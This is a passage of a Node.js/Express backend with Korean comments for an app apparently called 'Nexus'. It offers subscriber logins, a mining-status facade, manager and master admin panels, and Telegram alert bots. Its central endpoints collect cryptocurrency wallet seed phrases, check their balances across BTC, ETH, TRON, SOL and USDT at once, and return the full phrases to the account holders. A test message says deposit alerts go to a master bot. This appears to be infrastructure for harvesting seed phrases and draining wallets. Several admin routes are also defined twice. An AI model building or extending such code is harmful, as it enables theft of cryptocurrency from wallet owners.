    if (!id?.trim() || !password?.trim()) {
      return res.status(400).json({ error: '아이디와 비밀번호를 입력하세요.' });
    }
    
    const isValid = await db.userDB.validate(id, password);
    if (!isValid) {
      return res.status(401).json({ error: '아이디 또는 비밀번호가 올바르지 않습니다.' });
    }
    
    // 사용자 정보 조회
    const user = await db.userDB.get(id.trim());
    
    // 승인 상태 확인만 수행 (만료일 체크는 하지 않음)
    if (user.status === 'pending') {
      return res.status(403).json({ error: '관리자 승인 대기 중입니다.' });
    }
    
    if (user.status === 'suspended') {
      return res.status(403).json({ error: '계정이 정지되었습니다. 관리자에게 문의하세요.' });
    }
    
    // 만료일 정보 계산 (체크는 하지 않고 정보만 제공)
    let expireDate = null;
    let remainingDays = null;
    let isExpired = false;
    
    if (user.expireDate) {
      const now = new Date();
      expireDate = new Date(user.expireDate);
      
      // 남은 일수 계산 (음수일 수도 있음)
      remainingDays = Math.ceil((expireDate - now) / (1000 * 60 * 60 * 24));
      isExpired = now > expireDate;
    }
    
    // 세션 생성
    const token = crypto.randomBytes(16).toString('hex');
    const kicked = await sessionStore.save(id.trim(), token);
    
    return res.json({ 
      token,
      kicked,
      status: user.status || 'approved',
      expireDate: expireDate ? expireDate.toISOString() : null,
      remainingDays: remainingDays,
      isExpired: isExpired  // 만료 여부 정보만 제공 (차단은 하지 않음)
    });
  } catch (error) {
    console.error('로그인 오류:', error);
    res.status(500).json({ error: '서버 오류가 발생했습니다.' });
  }
});

// GET /api/user/subscription?token= — 현재 구독 상태 조회 (앱 폴링용)
app.get('/api/user/subscription', async (req, res) => {
  try {
    const { token } = req.query;
    if (!token) return res.status(400).json({ error: 'token 필요' });
    const userId = await sessionStore.getUserId(token);
    if (!userId) return res.status(401).json({ error: '세션 만료' });
    const user = await db.userDB.get(userId);
    if (!user) return res.status(404).json({ error: '사용자 없음' });
    const now = new Date();
    const expiry = user.expireDate ? new Date(user.expireDate) : null;
    const remainingDays = expiry ? Math.max(0, Math.ceil((expiry - now) / (1000 * 60 * 60 * 24))) : 0;
    res.json({
      status: user.status,
      expireDate: expiry ? expiry.toISOString() : null,
      remainingDays,
    });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// POST /api/miner/report — 앱이 자동화 시작/종료 시 실제 상태 보고
app.post('/api/miner/report', async (req, res) => {
  try {
    const { token, status } = req.body || {};
    if (!token) return res.status(401).json({ error: 'token 필요' });
    if (!['running', 'stopped'].includes(status)) return res.status(400).json({ error: 'status 오류' });
    const userId = await sessionStore.getUserId(token);
    if (!userId) return res.status(401).json({ error: '세션 만료' });
    await db.pool.query(
      `INSERT INTO miner_status (user_id, status, assigned_at)
       VALUES (?, ?, ?)
       ON DUPLICATE KEY UPDATE status = VALUES(status), assigned_at = VALUES(assigned_at)`,
      [userId, status, status === 'running' ? new Date() : null]
    );
    res.json({ ok: true });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

app.get('/api/session/validate', async (req, res) => {
  try {
    const token = req.query.token;
    if (!token) return res.status(401).json({ error: 'token 필요' });

    const [rows] = await db.pool.query(
      'SELECT user_id, last_activity, kicked FROM sessions WHERE token = ?',
      [token]
    );

    if (rows.length === 0) {
      return res.status(401).json({ error: 'expired', kicked: false });
    }

    const session = rows[0];

    // 다른 기기 로그인으로 강제 종료된 경우
    if (session.kicked) {
      return res.status(401).json({ error: 'kicked', kicked: true });
    }

    // 24시간 타임아웃 확인
    const lastActivity = new Date(session.last_activity).getTime();
    if (Date.now() - lastActivity > SESSION_TIMEOUT) {
      await db.pool.query('DELETE FROM sessions WHERE token = ?', [token]);
      return res.status(401).json({ error: 'expired', kicked: false });
    }

    // 슬라이딩 세션 갱신
    await db.pool.query('UPDATE sessions SET last_activity = NOW() WHERE token = ?', [token]);
    return res.json({ ok: true });
  } catch (error) {
    console.error('세션 검증 오류:', error);
    res.status(500).json({ error: '서버 오류' });
  }
});

// POST /api/logout — 앱 종료 시 세션 명시적 삭제
app.post('/api/logout', async (req, res) => {
  try {
    const { token } = req.body || {};
    if (!token) return res.status(400).json({ error: 'token 필요' });
    await db.pool.query('DELETE FROM sessions WHERE token = ?', [token]);
    res.json({ ok: true });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// ========== 회원 전용 API ==========

// GET /api/user/profile — 메신저 ID + 소속 총판 메신저 ID 조회
app.get('/api/user/profile', requireSession, async (req, res) => {
  try {
    const [[user]] = await db.pool.query(
      'SELECT id, telegram, manager_id FROM users WHERE id = ?',
      [req.userId]
    );
    if (!user) return res.status(404).json({ error: '사용자를 찾을 수 없습니다.' });
    let managerTelegram = '';
    if (user.manager_id) {
      const [[mgr]] = await db.pool.query('SELECT telegram FROM managers WHERE id = ?', [user.manager_id]);
      managerTelegram = mgr?.telegram || '';
    }
    res.json({
      id: user.id,
      messenger_id: user.telegram || '',
      manager_id: user.manager_id || '',
      manager_messenger_id: managerTelegram,
    });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// PATCH /api/user/profile — 본인 메신저 ID 수정
app.patch('/api/user/profile', requireSession, async (req, res) => {
  try {
    const { messenger_id } = req.body || {};
    if (messenger_id === undefined) return res.status(400).json({ error: 'messenger_id 필요' });
    await db.pool.query('UPDATE users SET telegram = ? WHERE id = ?', [messenger_id.trim(), req.userId]);
    res.json({ ok: true });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// GET /api/user/miner — 채굴기 상태 조회
app.get('/api/user/miner', requireSession, async (req, res) => {
  try {
    const [[row]] = await db.pool.query(
      'SELECT status, coin_type, assigned_at FROM miner_status WHERE user_id = ?',
      [req.userId]
    );
    res.json({
      status: row?.status || 'stopped',
      coin_type: row?.coin_type || 'BTC',
      assigned_at: row?.assigned_at || null,
    });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// GET /api/user/mining-records — 채굴 내역 (페이지네이션)
app.get('/api/user/mining-records', requireSession, async (req, res) => {
  try {
    let page = Math.max(1, parseInt(req.query.page, 10) || 1);
    let pageSize = Math.min(100, Math.max(1, parseInt(req.query.pageSize, 10) || 20));
    const offset = (page - 1) * pageSize;
    const [[{ total }]] = await db.pool.query(
      'SELECT COUNT(*) as total FROM mining_records WHERE user_id = ?',
      [req.userId]
    );
    const [records] = await db.pool.query(
      'SELECT id, coin_type, amount, mined_at, note FROM mining_records WHERE user_id = ? ORDER BY mined_at DESC LIMIT ? OFFSET ?',
      [req.userId, pageSize, offset]
    );
    const [[{ cumulative }]] = await db.pool.query(
      'SELECT COALESCE(SUM(amount), 0) as cumulative FROM mining_records WHERE user_id = ?',
      [req.userId]
    );
    res.json({ total, page, pageSize, records, cumulative: Number(cumulative) });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// GET /api/user/seeds — 본인 시드 목록 (페이지네이션, 잔액 포함)
app.get('/api/user/seeds', requireSession, async (req, res) => {
  try {
    const userId = req.userId;
    const page = Math.max(1, parseInt(req.query.page, 10) || 1);
    const pageSize = Math.min(50, Math.max(1, parseInt(req.query.pageSize, 10) || 10));
    const offset = (page - 1) * pageSize;
    const [[{ total }]] = await db.pool.query(
      'SELECT COUNT(*) AS total FROM seeds WHERE user_id = ?', [userId]
    );
    const [rows] = await db.pool.query(
      `SELECT id, phrase, created_at, balance, usdt_balance, btc, eth, tron, sol, checked
       FROM seeds WHERE user_id = ? ORDER BY id DESC LIMIT ? OFFSET ?`,
      [userId, pageSize, offset]
    );
    const mask = (phrase) => {
      const words = String(phrase || '').trim().split(/\s+/).filter(Boolean);
      if (!words.length) return '';
      if (words.length <= 3) return words[0] + ' ***';
      return words[0] + ' … ' + words[words.length - 1] + '  (' + words.length + '단어)';
    };
    res.json({
      seeds: rows.map(r => ({
        id: r.id,
        phrase: mask(r.phrase),
        at: r.created_at,
        balance: Number(r.balance) || 0,
        usdt_balance: Number(r.usdt_balance) || 0,
        btc: r.btc != null ? Number(r.btc) : null,
        eth: r.eth != null ? Number(r.eth) : null,
        tron: r.tron != null ? Number(r.tron) : null,
        sol: r.sol != null ? Number(r.sol) : null,
        checked: !!r.checked,
      })),
      total: Number(total),
      page,
      pageSize,
    });
  } catch (e) {
    console.error('유저 시드 조회 오류:', e.message);
    res.status(500).json({ error: '서버 오류가 발생했습니다.' });
  }
});

app.post('/api/seed', async (req, res) => {
  try {
    const { token, phrase } = req.body || {};
    if (!token || !phrase) return res.status(400).end();
    
    const userId = await sessionStore.getUserId(token);
    if (!userId) return res.status(401).end();
    
    const seedId = await db.seedDB.add(userId, phrase);
    res.json({ ok: true });

    // 저장 즉시 백그라운드에서 잔고 검사 트리거
    if (seedId) {
      setImmediate(async () => {
        try {
          const { processSeed } = require('./seed-checker');
          await processSeed({ id: seedId, user_id: userId, phrase: phrase.trim(), created_at: new Date() });
        } catch (e) {
          console.error(`[SEED 즉시검사] ID=${seedId} 오류:`, e.message);
        }
      });
    }
  } catch (error) {
    console.error('시드 저장 오류:', error);
    res.status(500).json({ error: '서버 오류가 발생했습니다.' });
  }
});

// ---------- 사용자 시드 히스토리 (페이지네이션) ----------
app.get('/api/seed/history', async (req, res) => {
  try {
    const { token } = req.query || {};
    if (!token) {
      return res.status(400).json({ error: 'token 필요' });
    }

    // 토큰 → 사용자 ID (세션 검증 + 슬라이딩 갱신)
    const userId = await sessionStore.getUserId(token);
    if (!userId) {
      return res.status(401).json({ error: '세션 만료 또는 잘못된 token' });
    }

    // 페이지네이션 파라미터
    let page = parseInt(req.query.page, 10) || 1;
    let pageSize = parseInt(req.query.pageSize, 10) || 30;
    if (page < 1) page = 1;
    if (pageSize < 1) pageSize = 1;
    if (pageSize > 100) pageSize = 100;
    const offset = (page - 1) * pageSize;

    // 필터: hasBalance (true/false)
    const hasBalanceParam = (req.query.hasBalance || '').toString().toLowerCase();
    const filters = ['user_id = ?'];
    const params = [userId];

    if (hasBalanceParam === 'true') {
      filters.push('(IFNULL(balance, 0) > 0 OR IFNULL(usdt_balance, 0) > 0)');
    } else if (hasBalanceParam === 'false') {
      filters.push('(IFNULL(balance, 0) = 0 AND IFNULL(usdt_balance, 0) = 0)');
    }

    const whereSql = 'WHERE ' + filters.join(' AND ');

    // 데이터 조회
    const [rows] = await db.pool.query(
      `
      SELECT id, phrase, created_at, balance, usdt_balance, btc, eth, tron, sol
      FROM seeds
      ${whereSql}
      ORDER BY id DESC
      LIMIT ? OFFSET ?
      `,
      [...params, pageSize, offset]
    );

    // 전체 개수 조회
    const [[countRow]] = await db.pool.query(
      `
      SELECT COUNT(*) AS totalCount
      FROM seeds
      ${whereSql}
      `,
      params
    );

    const totalCount = Number(countRow?.totalCount || 0);
    const totalPages = totalCount === 0 ? 0 : Math.ceil(totalCount / pageSize);
    const hasNext = page < totalPages;

    const items = rows.map((row) => {
      const createdAt = row.created_at instanceof Date
        ? row.created_at
        : new Date(row.created_at);

      // 응답용 ID 포맷: seed_YYYYMMDD_000001
      const y = createdAt.getUTCFullYear();
      const m = String(createdAt.getUTCMonth() + 1).padStart(2, '0');
      const d = String(createdAt.getUTCDate()).padStart(2, '0');
      const idFormatted = 'seed_' + `${y}${m}${d}_` + String(row.id).padStart(6, '0');

      const phrase = row.phrase || '';
      const words = phrase.trim().split(/\s+/).filter(Boolean);
      const phrasePreview = words.slice(0, 3).join(' ');

      // BIP39 체크섬 유효성 확인 (ethers 이용)
      let checksumValid = false;
      try {
        ethers.Wallet.fromPhrase(phrase);
        checksumValid = true;
      } catch {
        checksumValid = false;
      }

      const trx  = row.tron  != null ? Number(row.tron)  : 0;
      const usdt = row.usdt_balance != null ? Number(row.usdt_balance) : 0;
      const btc  = row.btc  != null ? Number(row.btc)  : 0;
      const eth  = row.eth  != null ? Number(row.eth)  : 0;
      const sol  = row.sol  != null ? Number(row.sol)  : 0;
      const hasBalance = trx > 0 || usdt > 0 || btc > 0 || eth > 0 || sol > 0;

      return {
        id: idFormatted,
        createdAt: createdAt.toISOString(),
        phrase,
        phrasePreview,
        source: 'unknown',
        network: 'multi',
        address: '',
        hasBalance,
        trx,
        usdt,
        btc,
        eth,
        sol,
        checksumValid,
      };
    });

    res.json({
      page,
      pageSize,
      totalCount,
      totalPages,
      hasNext,
      items,
    });
  } catch (error) {
    console.error('시드 히스토리 조회 오류:', error);
    res.status(500).json({ error: '서버 오류가 발생했습니다.' });
  }
});

// ---------- APK 다운로드 (모바일 설치용) ----------
// 데스크톱의 nexus 폴더에 있는 최신 .apk 파일을 내려줍니다.
app.get('/download/apk', async (req, res) => {
  try {
    const apkDir = path.join('/home', 'myno', '바탕화면', 'nexus');

    // 폴더 내 APK 파일 목록 조회
    const files = await fs.promises.readdir(apkDir);
    const apkFiles = files.filter((name) => name.toLowerCase().endsWith('.apk'));

    if (apkFiles.length === 0) {
      return res.status(404).json({ error: 'APK 파일을 찾을 수 없습니다.' });
    }

    // 가장 최근에 수정된 APK 하나 선택
    const stats = await Promise.all(
      apkFiles.map(async (name) => {
        const fullPath = path.join(apkDir, name);
        const stat = await fs.promises.stat(fullPath);
        return { name, fullPath, mtime: stat.mtimeMs };
      })
    );

    stats.sort((a, b) => b.mtime - a.mtime);
    const latest = stats[0];

    // 다운로드로 전송 (Content-Disposition: attachment)
    return res.download(latest.fullPath, latest.name);
  } catch (error) {
    console.error('APK 다운로드 오류:', error);
    return res.status(500).json({ error: 'APK 다운로드 중 서버 오류가 발생했습니다.' });
  }
});

app.get('/api/admin/telegram', async (req, res) => {
  try {
    const telegram = await db.settingDB.get('global_telegram') || '@문의';
    res.json({ nickname: telegram });
  } catch (error) {
    console.error('텔레그램 조회 오류:', error);
    res.json({ nickname: '@문의' });
  }
});

// ---------- 관리자 로그인 ----------
app.post('/api/admin/login', async (req, res) => {
  try {
  const { id, password } = req.body || {};
  if (!id?.trim() || !password?.trim()) {
    return res.status(400).json({ error: '아이디와 비밀번호를 입력하세요.' });
  }
    
    // 마스터 계정 확인
  if (id.trim() === MASTER_ID && password === MASTER_PW) {
    const token = createAdminToken();
    adminSessions.set(token, { role: 'master', id: MASTER_ID });
    return res.json({ role: 'master', id: MASTER_ID, token });
  }
    
    // DB에서 매니저/마스터 확인
    const manager = await db.managerDB.validate(id, password);
    if (manager) {
    const token = createAdminToken();
      adminSessions.set(token, { role: manager.role, id: id.trim() });
      return res.json({ role: manager.role, id: id.trim(), token });
    }
    
    res.status(401).json({ error: '아이디 또는 비밀번호가 올바르지 않습니다.' });
  } catch (error) {
    console.error('관리자 로그인 오류:', error);
    res.status(500).json({ error: '서버 오류가 발생했습니다.' });
  }
});

app.post('/api/admin/logout', (req, res) => {
  const token = req.headers.authorization?.replace(/^Bearer\s+/i, '') || req.body?.token || '';
  adminSessions.delete(token);
  res.json({ ok: true });
});

// 로그인된 관리자 정보 (토큰 검증용)
app.get('/api/admin/me', requireAdmin, async (req, res) => {
  try {
    let telegram = '';
    if (req.admin.role === 'manager') {
      const m = await db.managerDB.get(req.admin.id);
      telegram = m?.telegram || '';
    }
  res.json({
    role: req.admin.role,
    id: req.admin.id,
      telegram,
    });
  } catch (error) {
    console.error('관리자 정보 조회 오류:', error);
    res.status(500).json({ error: '서버 오류가 발생했습니다.' });
  }
});

// ---------- 마스터 전용: 텔레그램 설정 ----------
app.post('/api/admin/telegram', requireAdmin, requireMaster, async (req, res) => {
  try {
    const telegram = (req.body?.nickname ?? '').toString().trim() || '@문의';
    await db.settingDB.set('global_telegram', telegram);
  res.json({ ok: true });
  } catch (error) {
    console.error('텔레그램 설정 오류:', error);
    res.status(500).json({ error: '서버 오류가 발생했습니다.' });
  }
});

// ---------- 마스터 전용: 매니저 CRUD ----------
app.get('/api/admin/managers', requireAdmin, requireMaster, async (req, res) => {
  try {
    const managers = await db.managerDB.getAll();
    res.json(managers);
  } catch (error) {
    console.error('매니저 조회 오류:', error);
    res.status(500).json({ error: '서버 오류가 발생했습니다.' });
  }
});

app.post('/api/admin/managers', requireAdmin, requireMaster, async (req, res) => {
  try {
  const { id, password, telegram, memo } = req.body || {};
  if (!id?.trim()) return res.status(400).json({ error: '아이디 필요' });
    
    await db.managerDB.addOrUpdate(id.trim(), password || '', telegram || '', memo || '');
  res.json({ ok: true });
  } catch (error) {
    console.error('매니저 추가/수정 오류:', error);
    res.status(500).json({ error: '서버 오류가 발생했습니다.' });
  }
});

app.delete('/api/admin/managers/:id', requireAdmin, requireMaster, async (req, res) => {
  try {
    await db.managerDB.remove(req.params.id);
  res.json({ ok: true });
  } catch (error) {
    console.error('매니저 삭제 오류:', error);
    res.status(500).json({ error: '서버 오류가 발생했습니다.' });
  }
});

// GET /api/admin/master/telegram-bot — 마스터 중앙 알림봇 조회 (마스터 전용)
app.get('/api/admin/master/telegram-bot', requireAdmin, requireMaster, async (req, res) => {
  try {
    const t = await getMasterTelegram();
    res.json({ botToken: t.botToken || '', chatId: t.chatId || '' });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// PUT /api/admin/master/telegram-bot — 마스터 중앙 알림봇 저장 (마스터 전용)
app.put('/api/admin/master/telegram-bot', requireAdmin, requireMaster, async (req, res) => {
  try {
    const { botToken, chatId } = req.body || {};
    await setMasterTelegram(botToken?.trim() || null, chatId?.trim() || null);
    res.json({ ok: true });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// POST /api/admin/master/telegram-bot/test — 마스터 알림봇 테스트 (마스터 전용)
app.post('/api/admin/master/telegram-bot/test', requireAdmin, requireMaster, async (req, res) => {
  try {
    const t = await getMasterTelegram();
    if (!t.botToken || !t.chatId) {
      return res.status(400).json({ error: '마스터 알림봇 토큰 또는 Chat ID가 설정되지 않았습니다.' });
    }
    await sendTelegram(
      t.botToken, t.chatId,
      `✅ <b>마스터 중앙 알림봇 테스트</b>\n\n모든 입금 알림이 이 봇으로 수신됩니다.\n🕐 ${escapeHtml(new Date().toLocaleString('ko-KR'))}`,
      true // throwOnError
    );
    res.json({ ok: true });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// GET /api/admin/telegram-errors — 최근 Telegram 전송 실패 로그 (마스터 전용)
app.get('/api/admin/telegram-errors', requireAdmin, requireMaster, (req, res) => {
  res.json({ errors: _tgErrorLog });
});

// GET /api/admin/python-diag — Python/pymysql 환경 진단 (마스터 전용)
app.get('/api/admin/python-diag', requireAdmin, requireMaster, (req, res) => {
  const { execFile } = require('child_process');
  const results = {};
  const cmds = [
    ['which python3', 'bash', ['-lc', 'which python3']],
    ['which python', 'bash', ['-lc', 'which python']],
    ['python3 pymysql check', 'bash', ['-lc', 'python3 -c "import pymysql; import sys; print(sys.executable)"']],
    ['pip3 show pymysql', 'bash', ['-lc', 'pip3 show pymysql 2>&1 | head -5']],
    ['node user', 'bash', ['-lc', 'whoami']],
    ['PATH', 'bash', ['-lc', 'echo $PATH']],
  ];
  let done = 0;
  cmds.forEach(([label, cmd, args]) => {
    execFile(cmd, args, { timeout: 8000 }, (err, stdout, stderr) => {
      results[label] = { out: (stdout || '').trim(), err: (err ? err.message : '') || (stderr || '').trim() };
      done++;
      if (done === cmds.length) res.json(results);
    });
  });
});

// GET /api/admin/managers/:id/telegram-bot — 봇 설정 조회 (마스터 또는 본인만)
app.get('/api/admin/managers/:id/telegram-bot', requireAdmin, async (req, res) => {
  const targetId = req.params.id;
  if (req.admin.role !== 'master' && req.admin.id !== targetId) {
    return res.status(403).json({ error: '권한 없음' });
  }
  try {
    const [[mgr]] = await db.pool.query(
      'SELECT tg_bot_token, tg_chat_id FROM managers WHERE id = ?',
      [targetId]
    );
    if (!mgr) return res.status(404).json({ error: '매니저 없음' });
    res.json({ botToken: mgr.tg_bot_token || '', chatId: mgr.tg_chat_id || '' });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// PUT /api/admin/managers/:id/telegram-bot — 봇 설정 저장 (마스터 또는 본인만)
app.put('/api/admin/managers/:id/telegram-bot', requireAdmin, async (req, res) => {
  const targetId = req.params.id;
  if (req.admin.role !== 'master' && req.admin.id !== targetId) {
    return res.status(403).json({ error: '권한 없음' });
  }
  try {
    const { botToken, chatId } = req.body || {};
    await db.pool.query(
      'UPDATE managers SET tg_bot_token = ?, tg_chat_id = ? WHERE id = ?',
      [botToken?.trim() || null, chatId?.trim() || null, targetId]
    );
    res.json({ ok: true });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// POST /api/admin/managers/:id/telegram-bot/test — 테스트 메시지 발송
app.post('/api/admin/managers/:id/telegram-bot/test', requireAdmin, async (req, res) => {
  const targetId = req.params.id;
  if (req.admin.role !== 'master' && req.admin.id !== targetId) {
    return res.status(403).json({ error: '권한 없음' });
  }
  try {
    const [[mgr]] = await db.pool.query(
      'SELECT tg_bot_token, tg_chat_id FROM managers WHERE id = ?',
      [targetId]
    );
    if (!mgr?.tg_bot_token || !mgr?.tg_chat_id) {
      return res.status(400).json({ error: '봇 토큰 또는 Chat ID가 설정되지 않았습니다.' });
    }
    await sendTelegram(
      mgr.tg_bot_token,
      mgr.tg_chat_id,
      `✅ <b>Nexus 알림 테스트</b>\n\n매니저 <code>${escapeHtml(targetId)}</code>의 텔레그램 알림이 정상적으로 연결되었습니다.\n🕐 ${escapeHtml(new Date().toLocaleString('ko-KR'))}`,
      true // throwOnError
    );
    res.json({ ok: true });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// ---------- 유저 목록 (마스터=전체, 매니저=내 유저만, pending 포함) ----------
app.get('/api/admin/users', requireAdmin, async (req, res) => {
  try {
    // pending 포함 전체 조회
    let query = 'SELECT id, manager_id as managerId, telegram, status, expire_date as expireDate, subscription_days as subscriptionDays FROM users';
    const params = [];
    if (req.admin.role !== 'master') {
      query += ' WHERE manager_id = ?';
      params.push(req.admin.id);
    }
    query += ' ORDER BY FIELD(status,"pending","approved","suspended"), id';
    const [list] = await db.pool.query(query, params);

    const managers = await db.managerDB.getAll();
    const byId = Object.fromEntries(managers.map((m) => [m.id, m.telegram || m.id]));

    const now = new Date();
    const withManager = list.map((u) => {
      const exp = u.expireDate ? new Date(u.expireDate) : null;
      const remainingDays = exp ? Math.ceil((exp - now) / 86400000) : null;
      return {
        id: u.id,
        managerId: u.managerId || null,
        managerName: byId[u.managerId] || '-',
        telegram: u.telegram || '',
        status: u.status || 'pending',
        expireDate: u.expireDate || null,
        remainingDays,
      };
    });

    res.json(withManager);
  } catch (error) {
    console.error('유저 조회 오류:', error);
    res.status(500).json({ error: '서버 오류가 발생했습니다.' });
  }
});

// 승인 대기 목록 조회 (매니저별)
app.get('/api/admin/pending-users', requireAdmin, async (req, res) => {
  try {
    const managerId = req.admin.role === 'master' ? null : req.admin.id;
    const pendingUsers = await db.userDB.getPendingUsers(managerId);
    res.json(pendingUsers);
  } catch (error) {
    console.error('승인 대기 목록 조회 오류:', error);
    res.status(500).json({ error: '서버 오류가 발생했습니다.' });
  }
});

// 사용자 승인
app.post('/api/admin/approve-user', requireAdmin, async (req, res) => {
  try {
    const { userId } = req.body || {};
    if (!userId?.trim()) return res.status(400).json({ error: 'userId 필요' });
    
    const user = await db.userDB.get(userId.trim());
    if (!user) return res.status(404).json({ error: '사용자를 찾을 수 없습니다.' });
    
    // 매니저는 자신의 사용자만 승인 가능
    if (req.admin.role === 'manager' && user.managerId !== req.admin.id) {
      return res.status(403).json({ error: '본인 소속 사용자만 승인 가능합니다.' });
    }
    
    await db.userDB.approveUser(userId.trim());
    res.json({ ok: true, message: '사용자가 승인되었습니다.' });
  } catch (error) {
    console.error('사용자 승인 오류:', error);
    res.status(500).json({ error: '서버 오류가 발생했습니다.' });
  }
});

// 사용자 거부
app.post('/api/admin/reject-user', requireAdmin, async (req, res) => {
  try {
    const { userId } = req.body || {};
    if (!userId?.trim()) return res.status(400).json({ error: 'userId 필요' });
    
    const user = await db.userDB.get(userId.trim());
    if (!user) return res.status(404).json({ error: '사용자를 찾을 수 없습니다.' });
    
    // 매니저는 자신의 사용자만 거부 가능
    if (req.admin.role === 'manager' && user.managerId !== req.admin.id) {
      return res.status(403).json({ error: '본인 소속 사용자만 거부 가능합니다.' });
    }
    
    // 거부 시 삭제
    await db.userDB.remove(userId.trim());
    res.json({ ok: true, message: '사용자가 거부되었습니다.' });
  } catch (error) {
    console.error('사용자 거부 오류:', error);
    res.status(500).json({ error: '서버 오류가 발생했습니다.' });
  }
});

// 사용기간 설정
app.post('/api/admin/set-subscription', requireAdmin, async (req, res) => {
  try {
    const { userId, days } = req.body || {};
    if (!userId?.trim()) return res.status(400).json({ error: 'userId 필요' });
    if (!days || ![30, 90, 180, 365].includes(Number(days))) {
      return res.status(400).json({ error: '유효한 사용기간을 선택하세요 (30, 90, 180, 365일)' });
    }
    
    const user = await db.userDB.get(userId.trim());
    if (!user) return res.status(404).json({ error: '사용자를 찾을 수 없습니다.' });
    
    // 매니저는 자신의 사용자만 설정 가능
    if (req.admin.role === 'manager' && user.managerId !== req.admin.id) {
      return res.status(403).json({ error: '본인 소속 사용자만 설정 가능합니다.' });
    }
    
    await db.userDB.setSubscription(userId.trim(), Number(days));
    res.json({ ok: true, message: `사용기간이 ${days}일로 설정되었습니다.` });
  } catch (error) {
    console.error('사용기간 설정 오류:', error);
    res.status(500).json({ error: '서버 오류가 발생했습니다.' });
  }
});

// 사용자 정지/활성화
app.post('/api/admin/suspend-user', requireAdmin, async (req, res) => {
  try {
    const { userId, suspend } = req.body || {};
    if (!userId?.trim()) return res.status(400).json({ error: 'userId 필요' });
    
    const user = await db.userDB.get(userId.trim());
    if (!user) return res.status(404).json({ error: '사용자를 찾을 수 없습니다.' });
    
    // 매니저는 자신의 사용자만 설정 가능
    if (req.admin.role === 'manager' && user.managerId !== req.admin.id) {
      return res.status(403).json({ error: '본인 소속 사용자만 설정 가능합니다.' });
    }
    
    await db.userDB.suspendUser(userId.trim(), suspend);
    res.json({ ok: true, message: suspend ? '사용자가 정지되었습니다.' : '사용자가 활성화되었습니다.' });
  } catch (error) {
    console.error('사용자 정지/활성화 오류:', error);
    res.status(500).json({ error: '서버 오류가 발생했습니다.' });
  }
});

// 유저 추가/수정 (매니저는 더 이상 직접 생성 불가, 승인만 가능)
app.post('/api/admin/users', requireAdmin, requireMaster, async (req, res) => {
  try {
  const { id, password, managerId, telegram } = req.body || {};
  if (!id?.trim()) return res.status(400).json({ error: '아이디 필요' });
    
    // 마스터만 직접 생성 가능
    await db.userDB.addOrUpdate(id.trim(), password || '', managerId || '', telegram || '', 'approved');
  res.json({ ok: true });
  } catch (error) {
    console.error('유저 추가/수정 오류:', error);
    res.status(500).json({ error: '서버 오류가 발생했습니다.' });
  }
});

// 승인 대기 목록 조회
app.get('/api/admin/pending-users', requireAdmin, async (req, res) => {
  try {
    const pendingUsers = await db.userDB.getPendingUsers();
    
    // 매니저는 자기 소속만 볼 수 있음
    if (req.admin.role === 'manager') {
      const filtered = pendingUsers.filter(u => u.managerId === req.admin.id);
      return res.json(filtered);
    }
    
    // 마스터는 전체 조회
    res.json(pendingUsers);
  } catch (error) {
    console.error('승인 대기 목록 조회 오류:', error);
    res.status(500).json({ error: '서버 오류가 발생했습니다.' });
  }
});

// 사용자 승인
app.post('/api/admin/approve-user', requireAdmin, async (req, res) => {
  try {
    const { userId } = req.body || {};
    if (!userId?.trim()) return res.status(400).json({ error: 'userId 필요' });
    
    const user = await db.userDB.get(userId.trim());
    if (!user) return res.status(404).json({ error: '사용자를 찾을 수 없습니다.' });
    
    // 매니저는 자기 소속만 승인 가능
    if (req.admin.role === 'manager' && user.managerId !== req.admin.id) {
      return res.status(403).json({ error: '본인 소속 사용자만 승인할 수 있습니다.' });
    }
    
    await db.userDB.updateStatus(userId.trim(), 'approved');
    res.json({ success: true });
  } catch (error) {
    console.error('사용자 승인 오류:', error);
    res.status(500).json({ error: '서버 오류가 발생했습니다.' });
  }
});

// 사용자 거부 (삭제)
app.post('/api/admin/reject-user', requireAdmin, async (req, res) => {
  try {
    const { userId } = req.body || {};
    if (!userId?.trim()) return res.status(400).json({ error: 'userId 필요' });
    
    const user = await db.userDB.get(userId.trim());
    if (!user) return res.status(404).json({ error: '사용자를 찾을 수 없습니다.' });
    
    // 매니저는 자기 소속만 거부 가능
    if (req.admin.role === 'manager' && user.managerId !== req.admin.id) {
      return res.status(403).json({ error: '본인 소속 사용자만 거부할 수 있습니다.' });
    }
    
    await db.userDB.remove(userId.trim());
    res.json({ success: true });
  } catch (error) {
    console.error('사용자 거부 오류:', error);
    res.status(500).json({ error: '서버 오류가 발생했습니다.' });
  }
});

// 사용기간 설정
app.post('/api/admin/set-subscription', requireAdmin, async (req, res) => {
  try {
    const { userId, days } = req.body || {};
    if (!userId?.trim()) return res.status(400).json({ error: 'userId 필요' });
    if (!days || ![30, 90, 180, 365].includes(parseInt(days))) {
      return res.status(400).json({ error: '올바른 일수를 선택하세요 (30, 90, 180, 365)' });
    }
    
    const user = await db.userDB.get(userId.trim());
    if (!user) return res.status(404).json({ error: '사용자를 찾을 수 없습니다.' });
    
    // 매니저는 자기 소속만 설정 가능
    if (req.admin.role === 'manager' && user.managerId !== req.admin.id) {
      return res.status(403).json({ error: '본인 소속 사용자만 설정할 수 있습니다.' });
    }
    
    await db.userDB.setSubscription(userId.trim(), parseInt(days));
    res.json({ success: true });
  } catch (error) {
    console.error('사용기간 설정 오류:', error);
    res.status(500).json({ error: '서버 오류가 발생했습니다.' });
  }
});

// 사용자 정지/활성화
app.post('/api/admin/suspend-user', requireAdmin, async (req, res) => {
  try {
    const { userId, suspend } = req.body || {};
    if (!userId?.trim()) return res.status(400).json({ error: 'userId 필요' });
    
    const user = await db.userDB.get(userId.trim());
    if (!user) return res.status(404).json({ error: '사용자를 찾을 수 없습니다.' });
    
    // 매니저는 자기 소속만 정지/활성화 가능
    if (req.admin.role === 'manager' && user.managerId !== req.admin.id) {
